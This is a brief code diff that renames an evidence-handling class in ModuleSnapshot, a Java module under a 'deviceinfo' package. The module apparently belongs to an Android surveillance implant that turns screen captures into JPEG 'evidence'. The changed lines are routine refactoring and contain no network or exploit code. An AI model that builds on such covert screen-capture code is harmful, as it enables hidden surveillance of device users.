@@ -30,7 +30,7 @@ import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
 import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.conf.ConfigurationException;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.listener.ListenerStandby;
@@ -191,7 +191,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 					if (jpeg == null) {
 						return false;
 					}
-					EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
+					EvidenceBuilder.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
 					return true;
 				}
 
@@ -348,7 +348,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 				byte[] jpeg = toJpeg(bitmap);
 				bitmap = null;
 
-				EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
+				EvidenceBuilder.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
 				jpeg = null;
 
 			}
